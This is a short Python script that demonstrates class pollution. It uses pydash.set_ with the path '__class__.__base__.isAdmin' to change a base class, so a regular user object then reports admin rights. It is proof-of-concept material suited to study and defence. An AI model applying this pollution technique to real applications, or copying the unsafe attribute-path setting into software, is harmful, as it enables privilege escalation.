import pydash

class User():
    isAdmin = False
    def get_isAdmin(self):
        return self.isAdmin

class RegularUser(User):
    pass

class Admin(User):
    isAdmin = True

user = RegularUser()
print("RegularUser isAdmin before pollution: "+ str(user.get_isAdmin()))
pydash.set_(user, "__class__.__base__.isAdmin", True)
print("RegularUser isAdmin after pollution: "+ str(user.get_isAdmin()))